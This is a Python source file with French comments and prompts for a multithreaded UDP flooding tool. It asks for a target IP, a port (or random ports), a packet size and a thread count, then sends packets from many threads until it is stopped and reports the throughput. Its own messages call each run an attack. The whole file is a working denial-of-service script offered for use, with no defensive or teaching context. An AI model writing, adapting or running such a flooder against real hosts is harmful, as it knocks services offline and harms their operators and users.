# par pitié ne pas volé mon code et ne rien modiffié svp sah
import os
import socket
import random
import time
from threading import Thread
from colorama import init, Fore


init(autoreset=True)
ROUGE = Fore.RED
RESET = Fore.RESET

def effacer_ecran():
    """Efface l'écran selon le système d'exploitation."""
    os.system('cls' if os.name == 'nt' else 'clear')

class UDPFlooder:
    def __init__(self, ip, port, taille_paquet, nombre_threads):
        self.ip = ip
        self.port = port
        self.taille_paquet = taille_paquet
        self.nombre_threads = nombre_threads
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.donnees_paquet = b"x" * self.taille_paquet
        self.longueur_paquet = len(self.donnees_paquet)

    def demarrer_flood(self):
        self.actif = True
        self.bytes_envoyes = 0
        for _ in range(self.nombre_threads):
            Thread(target=self.envoyer_paquets).start()
        Thread(target=self.monitorer_traffic).start()

    def arreter_flood(self):
        self.actif = False

    def envoyer_paquets(self):
        while self.actif:
            try:
                self.client.sendto(self.donnees_paquet, (self.ip, self._get_port_aleatoire()))
                self.bytes_envoyes += self.longueur_paquet
            except Exception as e:
                print(f"{ROUGE}Erreur lors de l'envoi du paquet : {e}{RESET}")

    def _get_port_aleatoire(self):
        return self.port if self.port else random.randint(1, 65535)

    def monitorer_traffic(self):
        intervalle = 0.05
        temps_depart = time.time()
        total_bytes_envoyes = 0
        while self.actif:
            time.sleep(intervalle)
            temps_actuel = time.time()
            if temps_actuel - temps_depart >= 1:
                vitesse_mbps = self.bytes_envoyes * 8 / (1024 * 1024) / (temps_actuel - temps_depart)
                total_bytes_envoyes += self.bytes_envoyes
                print(f"{ROUGE}Vitesse : {vitesse_mbps:.2f} Mb/s - Total : {total_bytes_envoyes / (1024 * 1024 * 1024):.2f} Go{RESET}", end='\r')
                temps_depart = temps_actuel
                self.bytes_envoyes = 0

def obtenir_input(invite, defaut=None, type_cast=int):
    valeur = input(invite)
    if valeur == '':
        return defaut
    try:
        return type_cast(valeur)
    except ValueError:
        print(f"{ROUGE}Entrée invalide. Veuillez entrer un {type_cast.__name__} valide.{RESET}")
        return obtenir_input(invite, defaut, type_cast)

def principal():
    """Fonction principale pour exécuter l'outil de flood UDP."""

    ip = input(f"{ROUGE}Entrez l'adresse IP cible : {RESET}")
    if not ip.count('.') == 3:
        print(f"{ROUGE}Erreur ! Veuillez entrer une adresse IP valide.{RESET}")
        return

    port = obtenir_input(f"{ROUGE}Entrez le port cible (ou appuyez sur entrer pour cibler tous les ports) : {RESET}", defaut=None, type_cast=int)
    taille_paquet = obtenir_input(f"{ROUGE}Entrez la taille du paquet en octets (par défaut 1250) : {RESET}", defaut=1250)
    nombre_threads = obtenir_input(f"{ROUGE}Entrez le nombre de threads (par défaut 100) : {RESET}", defaut=100)

    flooder = UDPFlooder(ip, port, taille_paquet, nombre_threads)
    
    try:
        flooder.demarrer_flood()
        print(f"{ROUGE}Début de l'attaque sur {ip}:{port if port else 'tous les ports'}{RESET}")
        while True:
            time.sleep(1000000)
    except KeyboardInterrupt:
        flooder.arreter_flood()
        print(f"{ROUGE}Attaque arrêtée. Total des données envoyées : {flooder.bytes_envoyes / (1024 * 1024 * 1024):.2f} Go{RESET}")

def run():
    """Point d'entrée pour l'exécution du module."""
    principal()

if __name__ == "__main__":
    run()
